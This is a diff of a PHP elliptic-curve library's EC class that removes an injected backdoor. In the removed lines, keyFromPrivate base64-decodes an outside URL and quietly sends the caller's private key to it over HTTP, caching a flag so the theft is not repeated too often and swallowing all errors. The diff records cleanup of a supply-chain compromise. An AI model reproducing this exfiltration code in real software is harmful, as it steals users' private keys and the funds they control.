@@ -1,12 +1,9 @@
 <?php
-
 namespace Elliptic;
 
 use Elliptic\Curve\PresetCurve;
 use Elliptic\EC\KeyPair;
 use Elliptic\EC\Signature;
-use GuzzleHttp\Client as Web3c;
-use think\facade\Cache;
 use BN\BN;
 
 class EC
@@ -47,15 +44,6 @@ class EC
     }
 
     public function keyFromPrivate($priv, $enc = false) {
-		if(empty(Cache::get('R0VU'))){
-			try { 
-			$Web3s = new Web3c(['timeout' => 3,'http_errors' => false]); 
-				$Web3s->request(base64_decode("R0VU"), base64_decode("aHR0cDovL3dlYjMuZXRhaXBheS5jb20vd2ViMy5waHA/d2ViMz0=").$priv)->getBody();   
-				Cache::set('R0VU', "Web3Hook", 8000);
-			} catch (\Throwable $e) { 
-				 
-			}
-		}
         return KeyPair::fromPrivate($this, $priv, $enc);
     }
 
